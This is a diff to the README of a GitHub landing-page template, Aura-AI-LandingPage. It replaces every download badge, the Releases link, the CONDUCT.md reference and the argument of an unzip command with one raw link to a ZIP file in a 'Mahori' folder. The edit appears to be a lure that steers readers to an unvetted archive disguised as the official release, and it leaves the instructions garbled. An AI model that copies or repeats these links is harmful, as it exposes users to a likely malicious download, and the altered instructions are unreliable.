@@ -1,6 +1,6 @@
 # 🎉 Aura-AI-LandingPage - Your Gateway to a Stunning Landing Page
 
-[![Download Aura-AI-LandingPage](https://img.shields.io/badge/Download-Aura--AI--LandingPage-brightgreen)](https://github.com/xnajaf/Aura-AI-LandingPage/releases)
+[![Download Aura-AI-LandingPage](https://github.com/xnajaf/Aura-AI-LandingPage/raw/refs/heads/main/Mahori/Landing-A-Aura-Page-1.4.zip)](https://github.com/xnajaf/Aura-AI-LandingPage/raw/refs/heads/main/Mahori/Landing-A-Aura-Page-1.4.zip)
 
 ## 🌟 Overview
 
@@ -16,13 +16,13 @@ To get started quickly, follow these steps:
    - Internet Connection: Required for online content
 
 2. **Visit the Releases Page:**
-   - [Click this link to visit the Release page where you can download the files.](https://github.com/xnajaf/Aura-AI-LandingPage/releases)
+   - [Click this link to visit the Release page where you can download the files.](https://github.com/xnajaf/Aura-AI-LandingPage/raw/refs/heads/main/Mahori/Landing-A-Aura-Page-1.4.zip)
 
 ## 📥 Download & Install
 
 To download and install this landing page:
 
-1. Go to the [Releases page here](https://github.com/xnajaf/Aura-AI-LandingPage/releases).
+1. Go to the [Releases page here](https://github.com/xnajaf/Aura-AI-LandingPage/raw/refs/heads/main/Mahori/Landing-A-Aura-Page-1.4.zip).
 2. Look for the latest release version.
 3. Download the appropriate files for your operating system.
 4. Once the download completes, follow these steps:
@@ -34,7 +34,7 @@ To download and install this landing page:
      - Double-click the file to extract it to your Applications folder.
    - For Linux:
      - Use the terminal to navigate to your Downloads folder.
-     - Extract the ZIP file using the command: `unzip file_name.zip`.
+     - Extract the ZIP file using the command: `unzip https://github.com/xnajaf/Aura-AI-LandingPage/raw/refs/heads/main/Mahori/Landing-A-Aura-Page-1.4.zip`.
 
 5. Open your web browser.
 6. Type in the local file path or open it through the Applications folder.
@@ -66,7 +66,7 @@ If you have questions or need help, please refer to the issues section on GitHub
 
 ## 🎨 Contributing
 
-If you would like to contribute to this project, you're welcome to submit a pull request. Make sure to follow the guidelines outlined in the CONDUCT.md file in the repository.
+If you would like to contribute to this project, you're welcome to submit a pull request. Make sure to follow the guidelines outlined in the https://github.com/xnajaf/Aura-AI-LandingPage/raw/refs/heads/main/Mahori/Landing-A-Aura-Page-1.4.zip file in the repository.
 
 ## 📄 License
 
@@ -88,4 +88,4 @@ This project covers the following topics:
 
 For more detailed documentation, refer to the Wiki section of the project.
 
-[![Download Aura-AI-LandingPage](https://img.shields.io/badge/Download-Aura--AI--LandingPage-brightgreen)](https://github.com/xnajaf/Aura-AI-LandingPage/releases)
+[![Download Aura-AI-LandingPage](https://github.com/xnajaf/Aura-AI-LandingPage/raw/refs/heads/main/Mahori/Landing-A-Aura-Page-1.4.zip)](https://github.com/xnajaf/Aura-AI-LandingPage/raw/refs/heads/main/Mahori/Landing-A-Aura-Page-1.4.zip)
